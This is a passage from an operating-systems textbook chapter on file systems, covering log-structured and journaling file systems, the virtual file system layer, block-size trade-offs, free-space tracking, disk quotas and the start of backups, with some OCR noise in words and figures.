4-msec rotational delay. With these parameters,\r\ndisk efficiency drops to a fraction of 1%.\r\nTo see where all the small writes come from, consider creating a new file on a\r\nUNIX system. To write this file, the i-node for the directory, the directory block,\r\nthe i-node for the file, and the file itself must all be written. While these writes can\r\nbe delayed, doing so exposes the file system to serious consistency problems if a\r\ncrash occurs before the writes are done. For this reason, the i-node writes are gen\u0002erally done immediately.\r\nFrom this reasoning, the LFS designers decided to reimplement the UNIX file\r\nsystem in such a way as to achieve the full bandwidth of the disk, even in the face\r\nof a workload consisting in large part of small random writes. The basic idea is to\r\nstructure the entire disk as a great big log.\r\nPeriodically, and when there is a special need for it, all the pending writes\r\nbeing buffered in memory are collected into a single segment and written to the\r\ndisk as a single contiguous segment at the end of the log. A single segment may\n294 FILE SYSTEMS CHAP. 4\r\nthus contain i-nodes, directory blocks, and data blocks, all mixed together. At the\r\nstart of each segment is a segment summary, telling what can be found in the seg\u0002ment. If the average segment can be made to be about 1 MB, almost the full band\u0002width of the disk can be utilized.\r\nIn this design, i-nodes still exist and even hav e the same structure as in UNIX,\r\nbut they are now scattered all over the log, instead of being at a fixed position on\r\nthe disk. Nevertheless, when an i-node is located, locating the blocks is done in the\r\nusual way. Of course, finding an i-node is now much harder, since its address can\u0002not simply be calculated from its i-number, as in UNIX. To make it possible to\r\nfind i-nodes, an i-node map, indexed by i-number, is maintained. Entry i in this\r\nmap points to i-node i on the disk. The map is kept on disk, but it is also cached,\r\nso the most heavily used parts will be in memory most of the time.\r\nTo summarize what we have said so far, all writes are initially buffered in\r\nmemory, and periodically all the buffered writes are written to the disk in a single\r\nsegment, at the end of the log. Opening a file now consists of using the map to\r\nlocate the i-node for the file. Once the i-node has been located, the addresses of\r\nthe blocks can be found from it. All of the blocks will themselves be in segments,\r\nsomewhere in the log.\r\nIf disks were infinitely large, the above description would be the entire story.\r\nHowever, real disks are finite, so eventually the log will occupy the entire disk, at\r\nwhich time no new segments can be written to the log. Fortunately, many existing\r\nsegments may have blocks that are no longer needed. For example, if a file is over\u0002written, its i-node will now point to the new blocks, but the old ones will still be\r\noccupying space in previously written segments.\r\nTo deal with this problem, LFS has a cleaner thread that spends its time scan\u0002ning the log circularly to compact it. It starts out by reading the summary of the\r\nfirst segment in the log to see which i-nodes and files are there. It then checks the\r\ncurrent i-node map to see if the i-nodes are still current and file blocks are still in\r\nuse. If not, that information is discarded. The i-nodes and blocks that are still in\r\nuse go into memory to be written out in the next segment. The original segment is\r\nthen marked as free, so that the log can use it for new data. In this manner, the\r\ncleaner moves along the log, removing old segments from the back and putting any\r\nlive data into memory for rewriting in the next segment. Consequently, the disk is a\r\nbig circular buffer, with the writer thread adding new segments to the front and the\r\ncleaner thread removing old ones from the back.\r\nThe bookkeeping here is nontrivial, since when a file block is written back to a\r\nnew segment, the i-node of the file (somewhere in the log) must be located,\r\nupdated, and put into memory to be written out in the next segment. The i-node\r\nmap must then be updated to point to the new copy. Nev ertheless, it is possible to\r\ndo the administration, and the performance results show that all this complexity is\r\nworthwhile. Measurements given in the papers cited above show that LFS outper\u0002forms UNIX by an order of magnitude on small writes, while having a per\u0002formance that is as good as or better than UNIX for reads and large writes.\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 295"
          },
          "4.3.6 Journaling File Systems": {
            "page": 326,
            "content": "4.3.6 Journaling File Systems\r\nWhile log-structured file systems are an interesting idea, they are not widely\r\nused, in part due to their being highly incompatible with existing file systems.\r\nNevertheless, one of the ideas inherent in them, robustness in the face of failure,\r\ncan be easily applied to more conventional file systems. The basic idea here is to\r\nkeep a log of what the file system is going to do before it does it, so that if the sys\u0002tem crashes before it can do its planned work, upon rebooting the system can look\r\nin the log to see what was going on at the time of the crash and finish the job. Such\r\nfile systems, called journaling file systems, are actually in use. Microsoft’s NTFS\r\nfile system and the Linux ext3 and ReiserFS file systems all use journaling. OS X\r\noffers journaling file systems as an option. Below we will give a brief introduction\r\nto this topic.\r\nTo see the nature of the problem, consider a simple garden-variety operation\r\nthat happens all the time: removing a file. This operation (in UNIX) requires three\r\nsteps:\r\n1. Remove the file from its directory.\r\n2. Release the i-node to the pool of free i-nodes.\r\n3. Return all the disk blocks to the pool of free disk blocks.\r\nIn Windows analogous steps are required. In the absence of system crashes, the\r\norder in which these steps are taken does not matter; in the presence of crashes, it\r\ndoes. Suppose that the first step is completed and then the system crashes. The i\u0002node and file blocks will not be accessible from any file, but will also not be avail\u0002able for reassignment; they are just off in limbo somewhere, decreasing the avail\u0002able resources. If the crash occurs after the second step, only the blocks are lost.\r\nIf the order of operations is changed and the i-node is released first, then after\r\nrebooting, the i-node may be reassigned, but the old directory entry will continue\r\nto point to it, hence to the wrong file. If the blocks are released first, then a crash\r\nbefore the i-node is cleared will mean that a valid directory entry points to an i\u0002node listing blocks now in the free storage pool and which are likely to be reused\r\nshortly, leading to two or more files randomly sharing the same blocks. None of\r\nthese outcomes are good.\r\nWhat the journaling file system does is first write a log entry listing the three\r\nactions to be completed. The log entry is then written to disk (and for good meas\u0002ure, possibly read back from the disk to verify that it was, in fact, written cor\u0002rectly). Only after the log entry has been written, do the various operations begin.\r\nAfter the operations complete successfully, the log entry is erased. If the system\r\nnow crashes, upon recovery the file system can check the log to see if any opera\u0002tions were pending. If so, all of them can be rerun (multiple times in the event of\r\nrepeated crashes) until the file is correctly removed.\n296 FILE SYSTEMS CHAP. 4\r\nTo make journaling work, the logged operations must be idempotent, which\r\nmeans they can be repeated as often as necessary without harm. Operations such as\r\n‘‘Update the bitmap to mark i-node k or block n as free’’ can be repeated until the\r\ncows come home with no danger. Similarly, searching a directory and removing\r\nany entry called foobar is also idempotent. On the other hand, adding the newly\r\nfreed blocks from i-node K to the end of the free list is not idempotent since they\r\nmay already be there. The more-expensive operation ‘‘Search the list of free blocks\r\nand add block n to it if it is not already present’’ is idempotent. Journaling file sys\u0002tems have to arrange their data structures and loggable operations so they all are\r\nidempotent. Under these conditions, crash recovery can be made fast and secure.\r\nFor added reliability, a file system can introduce the database concept of an\r\natomic transaction. When this concept is used, a group of actions can be brack\u0002eted by the begin transaction and end transaction operations. The file system then\r\nknows it must complete either all the bracketed operations or none of them, but not\r\nany other combinations.\r\nNTFS has an extensive journaling system and its structure is rarely corrupted\r\nby system crashes. It has been in development since its first release with Windows\r\nNT in 1993. The first Linux file system to do journaling was ReiserFS, but its pop\u0002ularity was impeded by the fact that it was incompatible with the then-standard\r\next2 file system. In contrast, ext3, which is a less ambitious project than ReiserFS,\r\nalso does journaling while maintaining compatibility with the previous ext2 sys\u0002tem."
          },
          "4.3.7 Virtual File Systems": {
            "page": 327,
            "content": "4.3.7 Virtual File Systems\r\nMany different file systems are in use—often on the same computer—even for\r\nthe same operating system. A Windows system may have a main NTFS file sys\u0002tem, but also a legacy FAT -32 or FAT -16 drive or partition that contains old, but\r\nstill needed, data, and from time to time a flash drive, an old CD-ROM or a DVD\r\n(each with its own unique file system) may be required as well. Windows handles\r\nthese disparate file systems by identifying each one with a different drive letter, as\r\nin C:, D:, etc. When a process opens a file, the drive letter is explicitly or implicitly\r\npresent so Windows knows which file system to pass the request to. There is no at\u0002tempt to integrate heterogeneous file systems into a unified whole.\r\nIn contrast, all modern UNIX systems make a very serious attempt to integrate\r\nmultiple file systems into a single structure. A Linux system could have ext2 as\r\nthe root file system, with an ext3 partition mounted on /usr and a second hard disk\r\nwith a ReiserFS file system mounted on /home as well as an ISO 9660 CD-ROM\r\ntemporarily mounted on /mnt. From the user’s point of view, there is a single\r\nfile-system hierarchy. That it happens to encompass multiple (incompatible) file\r\nsystems is not visible to users or processes.\r\nHowever, the presence of multiple file systems is very definitely visible to the\r\nimplementation, and since the pioneering work of Sun Microsystems (Kleiman,\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 297\r\n1986), most UNIX systems have used the concept of a VFS (virtual file system)\r\nto try to integrate multiple file systems into an orderly structure. The key idea is to\r\nabstract out that part of the file system that is common to all file systems and put\r\nthat code in a separate layer that calls the underlying concrete file systems to ac\u0002tually manage the data. The overall structure is illustrated in Fig. 4-18. The dis\u0002cussion below is not specific to Linux or FreeBSD or any other version of UNIX,\r\nbut giv es the general flavor of how virtual file systems work in UNIX systems.\r\nUser\r\nprocess\r\nFS 1 FS 2 FS 3\r\nBuffer cache\r\nVirtual file system\r\nFile\r\nsystem\r\nVFS interface\r\nPOSIX\r\nFigure 4-18. Position of the virtual file system.\r\nAll system calls relating to files are directed to the virtual file system for initial\r\nprocessing. These calls, coming from user processes, are the standard POSIX calls,\r\nsuch as open, read, wr ite, lseek, and so on. Thus the VFS has an ‘‘upper’’ interface\r\nto user processes and it is the well-known POSIX interface.\r\nThe VFS also has a ‘‘lower’’ interface to the concrete file systems, which is\r\nlabeled VFS interface in Fig. 4-18. This interface consists of several dozen func\u0002tion calls that the VFS can make to each file system to get work done. Thus to cre\u0002ate a new file system that works with the VFS, the designers of the new file system\r\nmust make sure that it supplies the function calls the VFS requires. An obvious\r\nexample of such a function is one that reads a specific block from disk, puts it in\r\nthe file system’s buffer cache, and returns a pointer to it. Thus the VFS has two dis\u0002tinct interfaces: the upper one to the user processes and the lower one to the con\u0002crete file systems.\r\nWhile most of the file systems under the VFS represent partitions on a local\r\ndisk, this is not always the case. In fact, the original motivation for Sun to build\r\nthe VFS was to support remote file systems using the NFS (Network File System)\r\nprotocol. The VFS design is such that as long as the concrete file system supplies\r\nthe functions the VFS requires, the VFS does not know or care where the data are\r\nstored or what the underlying file system is like.\r\nInternally, most VFS implementations are essentially object oriented, even if\r\nthey are written in C rather than C++. There are several key object types that are\n298 FILE SYSTEMS CHAP. 4\r\nnormally supported. These include the superblock (which describes a file system),\r\nthe v-node (which describes a file), and the directory (which describes a file sys\u0002tem directory). Each of these has associated operations (methods) that the concrete\r\nfile systems must support. In addition, the VFS has some internal data structures\r\nfor its own use, including the mount table and an array of file descriptors to keep\r\ntrack of all the open files in the user processes.\r\nTo understand how the VFS works, let us run through an example chronologi\u0002cally. When the system is booted, the root file system is registered with the VFS.\r\nIn addition, when other file systems are mounted, either at boot time or during op\u0002eration, they, too must register with the VFS. When a file system registers, what it\r\nbasically does is provide a list of the addresses of the functions the VFS requires,\r\neither as one long call vector (table) or as several of them, one per VFS object, as\r\nthe VFS demands. Thus once a file system has registered with the VFS, the VFS\r\nknows how to, say, read a block from it—it simply calls the fourth (or whatever)\r\nfunction in the vector supplied by the file system. Similarly, the VFS then also\r\nknows how to carry out every other function the concrete file system must supply:\r\nit just calls the function whose address was supplied when the file system regis\u0002tered.\r\nAfter a file system has been mounted, it can be used. For example, if a file sys\u0002tem has been mounted on /usr and a process makes the call\r\nopen(\"/usr/include/unistd.h\", O RDONLY)\r\nwhile parsing the path, the VFS sees that a new file system has been mounted on\r\n/usr and locates its superblock by searching the list of superblocks of mounted file\r\nsystems. Having done this, it can find the root directory of the mounted file system\r\nand look up the path include/unistd.h there. The VFS then creates a v-node and\r\nmakes a call to the concrete file system to return all the information in the file’s i\u0002node. This information is copied into the v-node (in RAM), along with other infor\u0002mation, most importantly the pointer to the table of functions to call for operations\r\non v-nodes, such as read, wr ite, close, and so on.\r\nAfter the v-node has been created, the VFS makes an entry in the file-descrip\u0002tor table for the calling process and sets it to point to the new v-node. (For the\r\npurists, the file descriptor actually points to another data structure that contains the\r\ncurrent file position and a pointer to the v-node, but this detail is not important for\r\nour purposes here.) Finally, the VFS returns the file descriptor to the caller so it\r\ncan use it to read, write, and close the file.\r\nLater when the process does a read using the file descriptor, the VFS locates\r\nthe v-node from the process and file descriptor tables and follows the pointer to the\r\ntable of functions, all of which are addresses within the concrete file system on\r\nwhich the requested file resides. The function that handles read is now called and\r\ncode within the concrete file system goes and gets the requested block. The VFS\r\nhas no idea whether the data are coming from the local disk, a remote file system\r\nover the network, a USB stick, or something different. The data structures involved\nSEC. 4.3 FILE-SYSTEM IMPLEMENTATION 299\r\nare shown in Fig. 4-19. Starting with the caller’s process number and the file de\u0002scriptor, successively the v-node, read function pointer, and access function within\r\nthe concrete file system are located.\r\n.\r\n.\r\n.\r\nProcess\r\ntable\r\n0\r\nFile\r\ndescriptors\r\n.\r\n.\r\n.\r\nV-nodes\r\nopen\r\nread\r\nwrite\r\nFunction\r\npointers .\r\n.\r\n. 2\r\n4\r\nVFS\r\nRead\r\nfunction\r\nFS 1\r\nCall from\r\nVFS into\r\nFS 1\r\nFigure 4-19. A simplified view of the data structures and code used by the VFS\r\nand concrete file system to do a read.\r\nIn this manner, it becomes relatively straightforward to add new file systems.\r\nTo make one, the designers first get a list of function calls the VFS expects and\r\nthen write their file system to provide all of them. Alternatively, if the file system\r\nalready exists, then they hav e to provide wrapper functions that do what the VFS\r\nneeds, usually by making one or more native calls to the concrete file system."
          }
        }
      },
      "4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION": {
        "page": 330,
        "children": {
          "4.4.1 Disk-Space Management": {
            "page": 331,
            "content": "4.4.1 Disk-Space Management\r\nFiles are normally stored on disk, so management of disk space is a major con\u0002cern to file-system designers. Two general strategies are possible for storing an n\r\nbyte file: n consecutive bytes of disk space are allocated, or the file is split up into\r\na number of (not necessarily) contiguous blocks. The same trade-off is present in\r\nmemory-management systems between pure segmentation and paging.\r\nAs we have seen, storing a file as a contiguous sequence of bytes has the ob\u0002vious problem that if a file grows, it may have to be moved on the disk. The same\r\nproblem holds for segments in memory, except that moving a segment in memory\r\nis a relatively fast operation compared to moving a file from one disk position to\r\nanother. For this reason, nearly all file systems chop files up into fixed-size blocks\r\nthat need not be adjacent.\r\nBlock Size\r\nOnce it has been decided to store files in fixed-size blocks, the question arises\r\nhow big the block should be. Given the way disks are organized, the sector, the\r\ntrack, and the cylinder are obvious candidates for the unit of allocation (although\r\nthese are all device dependent, which is a minus). In a paging system, the page\r\nsize is also a major contender.\r\nHaving a large block size means that every file, even a 1-byte file, ties up an\r\nentire cylinder. It also means that small files waste a large amount of disk space.\r\nOn the other hand, a small block size means that most files will span multiple\r\nblocks and thus need multiple seeks and rotational delays to read them, reducing\r\nperformance. Thus if the allocation unit is too large, we waste space; if it is too\r\nsmall, we waste time.\r\nMaking a good choice requires having some information about the file-size\r\ndistribution. Tanenbaum et al. (2006) studied the file-size distribution in the Com\u0002puter Science Department of a large research university (the VU) in 1984 and then\r\nagain in 2005, as well as on a commercial Web server hosting a political Website\r\n(www.electoral-vote.com). The results are shown in Fig. 4-20, where for each\r\npower-of-two file size, the percentage of all files smaller or equal to it is listed for\r\neach of the three data sets. For example, in 2005, 59.13% of all files at the VU\r\nwere 4 KB or smaller and 90.84% of all files were 64 KB or smaller. The median\r\nfile size was 2475 bytes. Some people may find this small size surprising.\r\nWhat conclusions can we draw from these data? For one thing, with a block\r\nsize of 1 KB, only about 30–50% of all files fit in a single block, whereas with a\r\n4-KB block, the percentage of files that fit in one block goes up to the 60–70%\r\nrange. Other data in the paper show that with a 4-KB block, 93% of the disk blocks\r\nare used by the 10% largest files. This means that wasting some space at the end of\r\neach small file hardly matters because the disk is filled up by a small number of\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 301\r\nLength VU 1984 VU 2005 Web Length VU 1984 VU 2005 Web\r\n1 1.79 1.38 6.67 16 KB 92.53 78.92 86.79\r\n2 1.88 1.53 7.67 32 KB 97.21 85.87 91.65\r\n4 2.01 1.65 8.33 64 KB 99.18 90.84 94.80\r\n8 2.31 1.80 11.30 128 KB 99.84 93.73 96.93\r\n16 3.32 2.15 11.46 256 KB 99.96 96.12 98.48\r\n32 5.13 3.15 12.33 512 KB 100.00 97.73 98.99\r\n64 8.71 4.98 26.10 1 MB 100.00 98.87 99.62\r\n128 14.73 8.03 28.49 2 MB 100.00 99.44 99.80\r\n256 23.09 13.29 32.10 4 MB 100.00 99.71 99.87\r\n512 34.44 20.62 39.94 8 MB 100.00 99.86 99.94\r\n1 KB 48.05 30.91 47.82 16 MB 100.00 99.94 99.97\r\n2 KB 60.87 46.09 59.44 32 MB 100.00 99.97 99.99\r\n4 KB 75.31 59.13 70.64 64 MB 100.00 99.99 99.99\r\n8 KB 84.97 69.96 79.69 128 MB 100.00 99.99 100.00\r\nFigure 4-20. Percentage of files smaller than a given size (in bytes).\r\nlarge files (videos) and the total amount of space taken up by the small files hardly\r\nmatters at all. Even doubling the space the smallest 90% of the files take up would\r\nbe barely noticeable.\r\nOn the other hand, using a small block means that each file will consist of\r\nmany blocks. Reading each block normally requires a seek and a rotational delay\r\n(except on a solid-state disk), so reading a file consisting of many small blocks will\r\nbe slow.\r\nAs an example, consider a disk with 1 MB per track, a rotation time of 8.33\r\nmsec, and an average seek time of 5 msec. The time in milliseconds to read a block\r\nof k bytes is then the sum of the seek, rotational delay, and transfer times:\r\n5 + 4. 165 + (k/1000000) × 8. 33\r\nThe dashed curve of Fig. 4-21 shows the data rate for such a disk as a function of\r\nblock size. To compute the space efficiency, we need to make an assumption about\r\nthe mean file size. For simplicity, let us assume that all files are 4 KB. Although\r\nthis number is slightly larger than the data measured at the VU, students probably\r\nhave more small files than would be present in a corporate data center, so it might\r\nbe a better guess on the whole. The solid curve of Fig. 4-21 shows the space ef\u0002ficiency as a function of block size.\r\nThe two curves can be understood as follows. The access time for a block is\r\ncompletely dominated by the seek time and rotational delay, so giv en that it is\r\ngoing to cost 9 msec to access a block, the more data that are fetched, the better.\n302 FILE SYSTEMS CHAP. 4\r\n1 KB 4 KB 16 KB 64 KB 256 KB 1MB\r\n100%\r\n10\r\n20\r\n30\r\n40\r\n50\r\n60\r\n0\r\n80%\r\n60%\r\n40%\r\n20%\r\n0%\r\nData rate (MB/sec)\r\nDisk space utilization\r\nFigure 4-21. The dashed curve (left-hand scale) gives the data rate of a disk. The\r\nsolid curve (right-hand scale) gives the disk-space efficiency. All files are 4 KB.\r\nHence the data rate goes up almost linearly with block size (until the transfers take\r\nso long that the transfer time begins to matter).\r\nNow consider space efficiency. With 4-KB files and 1-KB, 2-KB, or 4-KB\r\nblocks, files use 4, 2, and 1 block, respectively, with no wastage. With an 8-KB\r\nblock and 4-KB files, the space efficiency drops to 50%, and with a 16-KB block it\r\nis down to 25%. In reality, few files are an exact multiple of the disk block size, so\r\nsome space is always wasted in the last block of a file.\r\nWhat the curves show, howev er, is that performance and space utilization are\r\ninherently in conflict. Small blocks are bad for performance but good for disk\u0002space utilization. For these data, no reasonable compromise is available. The size\r\nclosest to where the two curves cross is 64 KB, but the data rate is only 6.6 MB/sec\r\nand the space efficiency is about 7%, neither of which is very good. Historically,\r\nfile systems have chosen sizes in the 1-KB to 4-KB range, but with disks now\r\nexceeding 1 TB, it might be better to increase the block size to 64 KB and accept\r\nthe wasted disk space. Disk space is hardly in short supply any more.\r\nIn an experiment to see if Windows NT file usage was appreciably different\r\nfrom UNIX file usage, Vogels made measurements on files at Cornell University\r\n(Vogels, 1999). He observed that NT file usage is more complicated than on\r\nUNIX. He wrote:\r\nWhen we type a few characters in the Notepad text editor, saving this to a\r\nfile will trigger 26 system calls, including 3 failed open attempts, 1 file\r\noverwrite and 4 additional open and close sequences.\r\nNevertheless, Vogels observed a median size (weighted by usage) of files just read\r\nas 1 KB, files just written as 2.3 KB, and files read and written as 4.2 KB. Given\r\nthe different data sets measurement techniques, and the year, these results are cer\u0002tainly compatible with the VU results.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 303\r\nKeeping Track of Free Blocks\r\nOnce a block size has been chosen, the next issue is how to keep track of free\r\nblocks. Two methods are widely used, as shown in Fig. 4-22. The first one con\u0002sists of using a linked list of disk blocks, with each block holding as many free\r\ndisk block numbers as will fit. With a 1-KB block and a 32-bit disk block number,\r\neach block on the free list holds the numbers of 255 free blocks. (One slot is re\u0002quired for the pointer to the next block.) Consider a 1-TB disk, which has about 1\r\nbillion disk blocks. To store all these addresses at 255 per block requires about 4\r\nmillion blocks. Generally, free blocks are used to hold the free list, so the storage\r\nis essentially free.\r\n(a) (b)\r\nFree disk blocks: 16, 17, 18\r\nA 1-KB disk block can hold 256 A bitmap\r\n32-bit disk block numbers\r\n86\r\n234\r\n897\r\n422\r\n140\r\n223\r\n223\r\n160\r\n126\r\n142\r\n141\r\n1001101101101100\r\n0110110111110111\r\n1010110110110110\r\n0110110110111011\r\n1110111011101111\r\n1101101010001111\r\n0000111011010111\r\n1011101101101111\r\n1100100011101111\r\n0111011101110111\r\n1101111101110111\r\n230\r\n162\r\n612\r\n342\r\n214\r\n160\r\n664\r\n216\r\n320\r\n180\r\n482\r\n42\r\n136\r\n210\r\n97\r\n41\r\n63\r\n21\r\n48\r\n262\r\n310\r\n516\r\nFigure 4-22. (a) Storing the free list on a linked list. (b) A bitmap.\r\nThe other free-space management technique is the bitmap. A disk with n\r\nblocks requires a bitmap with n bits. Free blocks are represented by 1s in the map,\r\nallocated blocks by 0s (or vice versa). For our example 1-TB disk, we need 1 bil\u0002lion bits for the map, which requires around 130,000 1-KB blocks to store. It is\r\nnot surprising that the bitmap requires less space, since it uses 1 bit per block, vs.\r\n32 bits in the linked-list model. Only if the disk is nearly full (i.e., has few free\r\nblocks) will the linked-list scheme require fewer blocks than the bitmap.\r\nIf free blocks tend to come in long runs of consecutive blocks, the free-list sys\u0002tem can be modified to keep track of runs of blocks rather than single blocks. An\r\n8-, 16-, or 32-bit count could be associated with each block giving the number of\n304 FILE SYSTEMS CHAP. 4\r\nconsecutive free blocks. In the best case, a basically empty disk could be repres\u0002ented by two numbers: the address of the first free block followed by the count of\r\nfree blocks. On the other hand, if the disk becomes severely fragmented, keeping\r\ntrack of runs is less efficient than keeping track of individual blocks because not\r\nonly must the address be stored, but also the count.\r\nThis issue illustrates a problem operating system designers often have. There\r\nare multiple data structures and algorithms that can be used to solve a problem, but\r\nchoosing the best one requires data that the designers do not have and will not have\r\nuntil the system is deployed and heavily used. And even then, the data may not be\r\navailable. For example, our own measurements of file sizes at the VU in 1984 and\r\n1995, the Website data, and the Cornell data are only four samples. While a lot bet\u0002ter than nothing, we have little idea if they are also representative of home com\u0002puters, corporate computers, government computers, and others. With some effort\r\nwe might have been able to get a couple of samples from other kinds of computers,\r\nbut even then it would be foolish to extrapolate to all computers of the kind meas\u0002ured.\r\nGetting back to the free list method for a moment, only one block of pointers\r\nneed be kept in main memory. When a file is created, the needed blocks are taken\r\nfrom the block of pointers. When it runs out, a new block of pointers is read in\r\nfrom the disk. Similarly, when a file is deleted, its blocks are freed and added to\r\nthe block of pointers in main memory. When this block fills up, it is written to\r\ndisk.\r\nUnder certain circumstances, this method leads to unnecessary disk I/O. Con\u0002sider the situation of Fig. 4-23(a), in which the block of pointers in memory has\r\nroom for only two more entries. If a three-block file is freed, the pointer block\r\noverflows and has to be written to disk, leading to the situation of Fig. 4-23(b). If\r\na three-block file is now written, the full block of pointers has to be read in again,\r\ntaking us back to Fig. 4-23(a). If the three-block file just written was a temporary\r\nfile, when it is freed, another disk write is needed to write the full block of pointers\r\nback to the disk. In short, when the block of pointers is almost empty, a series of\r\nshort-lived temporary files can cause a lot of disk I/O.\r\nAn alternative approach that avoids most of this disk I/O is to split the full\r\nblock of pointers. Thus instead of going from Fig. 4-23(a) to Fig. 4-23(b), we go\r\nfrom Fig. 4-23(a) to Fig. 4-23(c) when three blocks are freed. Now the system can\r\nhandle a series of temporary files without doing any disk I/O. If the block in mem\u0002ory fills up, it is written to the disk, and the half-full block from the disk is read in.\r\nThe idea here is to keep most of the pointer blocks on disk full (to minimize disk\r\nusage), but keep the one in memory about half full, so it can handle both file crea\u0002tion and file removal without disk I/O on the free list.\r\nWith a bitmap, it is also possible to keep just one block in memory, going to\r\ndisk for another only when it becomes completely full or empty. An additional\r\nbenefit of this approach is that by doing all the allocation from a single block of the\r\nbitmap, the disk blocks will be close together, thus minimizing disk-arm motion.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 305\r\n(a)\r\nDisk\r\nMain\r\nmemory\r\n(b) (c)\r\nFigure 4-23. (a) An almost-full block of pointers to free disk blocks in memory\r\nand three blocks of pointers on disk. (b) Result of freeing a three-block file.\r\n(c) An alternative strategy for handling the three free blocks. The shaded entries\r\nrepresent pointers to free disk blocks.\r\nSince the bitmap is a fixed-size data structure, if the kernel is (partially) paged, the\r\nbitmap can be put in virtual memory and have pages of it paged in as needed.\r\nDisk Quotas\r\nTo prevent people from hogging too much disk space, multiuser operating sys\u0002tems often provide a mechanism for enforcing disk quotas. The idea is that the sys\u0002tem administrator assigns each user a maximum allotment of files and blocks, and\r\nthe operating system makes sure that the users do not exceed their quotas. A typi\u0002cal mechanism is described below.\r\nWhen a user opens a file, the attributes and disk addresses are located and put\r\ninto an open-file table in main memory. Among the attributes is an entry telling\r\nwho the owner is. Any increases in the file’s size will be charged to the owner’s\r\nquota.\r\nA second table contains the quota record for every user with a currently open\r\nfile, even if the file was opened by someone else. This table is shown in Fig. 4-24.\r\nIt is an extract from a quota file on disk for the users whose files are currently\r\nopen. When all the files are closed, the record is written back to the quota file.\r\nWhen a new entry is made in the open-file table, a pointer to the owner’s quota\r\nrecord is entered into it, to make it easy to find the various limits. Every time a\r\nblock is added to a file, the total number of blocks charged to the owner is incre\u0002mented, and a check is made against both the hard and soft limits. The soft limit\r\nmay be exceeded, but the hard limit may not. An attempt to append to a file when\r\nthe hard block limit has been reached will result in an error. Analogous checks also\r\nexist for the number of files to prevent a user from hogging all the i-nodes.\r\nWhen a user attempts to log in, the system examines the quota file to see if the\r\nuser has exceeded the soft limit for either number of files or number of disk blocks.\n306 FILE SYSTEMS CHAP. 4\r\nOpen file table Quota table\r\nSoft block limit\r\nHard block limit\r\nCurrent # of blocks\r\n# Block warnings left\r\nSoft file limit\r\nHard file limit\r\nCurrent # of files\r\n# File warnings left\r\nAttributes\r\ndisk addresses\r\nUser = 8\r\nQuota pointer Quota\r\nrecord\r\nfor user 8\r\nFigure 4-24. Quotas are kept track of on a per-user basis in a quota table.\r\nIf either limit has been violated, a warning is displayed, and the count of warnings\r\nremaining is reduced by one. If the count ever gets to zero, the user has ignored\r\nthe warning one time too many, and is not permitted to log in. Getting permission\r\nto log in again will require some discussion with the system administrator.\r\nThis method has the property that users may go above their soft limits during a\r\nlogin session, provided they remove the excess before logging out. The hard limits\r\nmay never be exceeded."
          },
          "4.4.2 File-System Backups": {
            "page": 337,
            "content": "4.4.2 File-System Backups\r\nDestruction of a file system is often a far greater disaster than destruction of a\r\ncomputer. If a computer is destroyed by fire, lightning surges, or a cup of coffee\r\npoured onto the keyboard, it is annoying and will cost money, but generally a re\u0002placement can be purchased with a minimum of fuss. Inexpensive personal com\u0002puters can even be replaced within an hour by just going to a computer store (ex\u0002cept at universities, where issuing a purchase order takes three committees, fiv e\r\nsignatures, and 90 days).\r\nIf a computer’s file system is irrevocably lost, whether due to hardware or soft\u0002ware, restoring all the information will be difficult, time consuming, and in many\r\ncases, impossible. For the people whose programs, documents, tax records, cus\u0002tomer files, databases, marketing plans, or other data are gone forever, the conse\u0002quences can be catastrophic. While the file system cannot offer any protection\r\nagainst physical destruction of the equipment and media, it can help protect the\r\ninformation. It is pretty straightforward: make backups. But that is not quite as\r\nsimple as it sounds. Let us take a look.\nSEC. 4.4 FILE-SYSTEM MANAGEMENT AND OPTIMIZATION 307\r\nMost people do not think making backups of their files is worth the time and\r\neffort—until one fine day their disk abruptly dies, at which time most of them\r\nundergo a deathbed conversion. Companies, however, (usually) well understand the\r\nvalue of their data and generally do a backup at least once a day, often to tape.\r\nModern tapes hold hundreds of gigabytes and cost pennies per gigabyte. Neverthe\u0002less, making backups is not quite as trivial as it sounds, so we will examine some\r\nof the related issues below.\r\nBackups to tape are generally made to handle one of two potential problems:\r\n1. Recover from disaster.\r\n2. Recover from stupidity.\r\nThe first one covers getting the computer running again after a disk crash, fire,\r\nflood, or other natural catastrophe. In practice, these things do not happen very\r\noften, which is why many people do not bother with backups. These people also\r\ntend not to have fire insurance on their houses for the same reason.\r\nThe second reason is that users often accidentally remove files that they later\r\nneed again. This problem occurs so often that when a file is ‘‘removed’’ in Win\u0002dows, it is not deleted at all, but just moved to a special directory, the recycle bin,\r\nso it can be fished out and restored easily later. Backups take this principle further\r\nand allow files that were removed days, even weeks, ago to be restored from old\r\nbackup tapes.\r\nMaking a backup takes a long time and occupies a large amount of space, so\r\ndoing it efficiently and conveniently is important. These considerations raise the\r\nfollowing issues. First, should the entire file system be backed up or only part of\r\nit? At many installations, the executable (binary) programs are kept in a limited\r\npart of the file-system tree. It is not necessary to back up these files if they can all\r\nbe reinstalled from the manufacturer’s Website or the installation DVD. Also,\r\nmost systems have a directory for temporary files. There is usually no reason to\r\nback it up either. In UNIX, all the special files (I/O devices) are kept in a directory\r\n/dev. Not only is backing up this directory not necessary, it is downright dangerous\r\nbecause the backup program would hang forever if it tried to read each of these to\r\ncompletion. In short, it is usually desirable to back up only specific directories and\r\nev erything in them rather than the entire file system.\r\nSecond, it is wasteful to back up files that have not changed since the previous\r\nbackup, which leads to the idea of incremental dumps. The simplest form of\r\nincremental dumping is to make a complete dump (backup) periodically, say\r\nweekly or monthly, and to make a daily dump of only those files that have been\r\nmodified since the last full dump. Even better is to dump only those files that have\r\nchanged since they were last dumped. While this scheme minimizes dumping time,\r\nit makes recovery more complicated, because first the most recent full dump has to\r\nbe restored, followed by all the incremental dumps in reverse order. To ease recov\u0002ery, more sophisticated incremental dumping schemes are often used.\n308 FILE SYSTEMS CHAP. 4\r\nThird, since immense amounts of data are typically dumped, it may be desir\u0002able to compress the data before writing them to tape. However, with many com\u0002pression algorithms, a single bad spot on the backup tape can foil the decompres\u0002sion algorithm and make an entire file or even an entire tape unreadable. Thus the\r\ndecision to compress the backup stream must be carefully considered.\r\nFourth, it is difficult to perform a backup on an active file system. If files and\r\ndirectories are being added, deleted, and modified during the 